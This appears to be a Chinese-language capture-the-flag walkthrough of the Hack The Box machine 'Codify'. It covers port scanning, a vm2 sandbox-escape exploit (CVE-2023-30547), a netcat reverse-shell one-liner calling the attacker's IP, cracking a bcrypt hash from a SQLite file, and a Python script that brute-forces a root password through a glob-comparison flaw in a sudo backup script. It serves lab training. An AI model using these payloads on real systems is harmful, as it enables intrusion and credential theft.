# 扫描
```
┌──(root㉿kali)-[~]
└─# nmap -p- --open -Pn 10.10.11.239                                                                    
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-20 22:02 EST
Nmap scan report for 10.10.11.239
Host is up (0.48s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 119.91 seconds
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.239 -p 22,80,3000                                                          
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-20 22:04 EST
Nmap scan report for 10.10.11.239
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   592.74 ms 10.10.16.1
2   286.53 ms 10.10.11.239

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.82 seconds

```


echo "10.10.11.239 codify.htb" >> /etc/hosts


# web

首页是文字，有一个node.js的运行页面在：http://codify.htb/editor

上面的页面有限制：
```

Limitations

The Codify platform allows users to write and run Node.js code online, but there are certain limitations in place to ensure the security of the platform and its users.
Restricted Modules

The following Node.js modules have been restricted from importing:

    child_process
    fs

This is to prevent users from executing arbitrary system commands, which could be a major security risk.
Module Whitelist

Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing support@codify.htb while our ticketing system is being migrated.

    url
    crypto
    util
    events
    assert
    stream
    path
    os
    zlib


```

# CVE-2023-30547

[参考这个POC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

可以沙箱逃逸，执行系统命令:

payload
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = "whoami"
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`

console.log(vm.run(code));
```


rev shell，替换一行：
```
cmd = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f"
```


拿到立足点
```
┌──(root㉿kali)-[~/htb/Codify]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.239] 38210
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
$ 

```

找到一个数据库文件
```
svc@codify:/var/www/contact$ ls     
ls
index.js  package.json  package-lock.json  templates  tickets.db
svc@codify:/var/www/contact$ strings tickets.db              
strings tickets.db
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
        tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
svc@codify:/var/www/contact$ 

```

有一个哈希，保存到hash.txt

```
┌──(root㉿kali)-[~/htb/Codify]
└─# cat hash.txt   
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

```

破解出来是：
```
┌──(root㉿kali)-[~/htb/Codify]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:01:21 DONE (2024-02-21 03:48) 0.01222g/s 16.72p/s 16.72c/s 16.72C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


ssh登录joshua
```
┌──(root㉿kali)-[~/htb/Codify]
└─# ssh joshua@10.10.11.239
The authenticity of host '10.10.11.239 (10.10.11.239)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.239' (ED25519) to the list of known hosts.
joshua@10.10.11.239's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 21 08:50:35 AM UTC 2024

  System load:                      0.11767578125
  Usage of /:                       64.0% of 6.50GB
  Memory usage:                     30%
  Swap usage:                       0%
  Processes:                        248
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:ae76


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Feb 21 08:32:45 2024 from 10.10.14.4
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt 
530027175ae8dae57918df2886472879

```

# 提权

sudo特权
```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```



文件内容:
```
joshua@codify:~$ ls -alh /opt/scripts/mysql-backup.sh
-rwxr-xr-x 1 root root 928 Nov  2 12:26 /opt/scripts/mysql-backup.sh
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

这里我以为是命令注入，试了很多方法不行，看别的wp发现是数据库爆破

使用这个脚本
```
joshua@codify:~$ cat test.py 
import subprocess
import string

def main():
    chars=list(string.ascii_letters+string.digits) #Make a list of all characters possible(alphabets and numbers)
    pswd=""
    check=0 #Will check if all password characters found or not.
    
    while check==0:
        for char in chars:
            cmd=f"echo '{pswd}{char}*' | sudo /opt/scripts/mysql-backup.sh"
            out=subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True).stdout
            if "Password confirmed!" in out:
                pswd+=char
                break #If character found break the loop
            else: #Redundant and added just such that you don't get confused with the below else statement.
                pass
        else: #If no character matched which means all of the characters were found.
            check=1
            print("[+] Password: "+pswd)

if __name__=="__main__":
    main()

```

拿到root

```
joshua@codify:~$ python3 test.py 
[+] Password: kljh12k3jhaskjh12kjh3
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cat /root/root.txt
d71bbfa6d48dcbb97575bacbee59af0f
root@codify:/home/joshua# 

```